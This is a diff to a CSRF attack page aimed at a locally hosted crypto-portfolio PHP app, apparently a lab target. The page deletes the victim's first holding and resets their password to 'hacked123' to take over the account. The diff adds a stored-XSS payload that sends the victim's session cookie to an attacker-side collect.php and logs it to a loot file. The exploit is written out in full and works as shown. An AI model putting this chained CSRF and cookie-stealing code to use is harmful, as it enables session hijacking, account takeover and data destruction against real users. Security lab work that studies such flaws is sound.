@@ -6,7 +6,9 @@
     1. deletes the victim's FIRST holding (dynamic id, scraped from their
        dashboard — same trick as csrf_delete.html)
     2. changes their account password to "hacked123"      -> account takeover
-    3. injects a stored-XSS holding into their portfolio
+    3. injects a stored-XSS holding whose payload exfiltrates the victim's
+       session cookie to attacker/collect.php (-> loot/cookie.txt) the next
+       time the dashboard is viewed -> session hijack
 
   All state-changing endpoints lack a CSRF token and the session cookie has no
   SameSite restriction, so the victim's session is (ab)used for all three.
@@ -30,21 +32,23 @@
     <input type="hidden" name="coin_id" value="1">
     <input type="hidden" name="amount" value="0.1">
     <input type="hidden" name="buy_price" value="1">
-    <!-- Quote-free payload: single quotes would break out of the app's
-         INSERT ... '$notes' string and abort the insert (its own SQLi flaw). -->
-    <input type="hidden" name="notes" value="&lt;script&gt;alert(document.domain)&lt;/script&gt;">
+    <!-- Stored-XSS cookie stealer. Uses DOUBLE quotes only: a single quote
+         would break out of the app's INSERT ... '$notes' string and abort the
+         insert (its own SQLi flaw). When the victim next loads the dashboard,
+         this runs and ships document.cookie (incl. PHPSESSID) to collect.php. -->
+    <input type="hidden" name="notes" value="&lt;script&gt;new Image().src=&quot;http://localhost/crypto-tracker/attacker/collect.php?c=&quot;+encodeURIComponent(document.cookie)&lt;/script&gt;">
   </form>
 
   <script>
     var APP = 'http://localhost/crypto-tracker';
 
     (async function () {
-      // 1. Dynamic delete of the victim's first holding.
+      // 1. Dynamic delete of the victim's first holding (same-origin read).
       try {
-        var html = await fetch(APP + '/dashboard.php', { credentials: 'include' })
+        var html = await fetch(APP + '/dashboard.php?_=' + Date.now(), { credentials: 'include' })
                           .then(function (r) { return r.text(); });
         var m = html.match(/delete_holding\.php\?id=(\d+)/);
-        if (m) { (new Image()).src = APP + '/delete_holding.php?id=' + m[1]; }
+        if (m) { await fetch(APP + '/delete_holding.php?id=' + m[1], { credentials: 'include' }); }
       } catch (e) { /* silent */ }
 
       // 2 + 3. Password change, then the stored-XSS holding (staggered so both land).
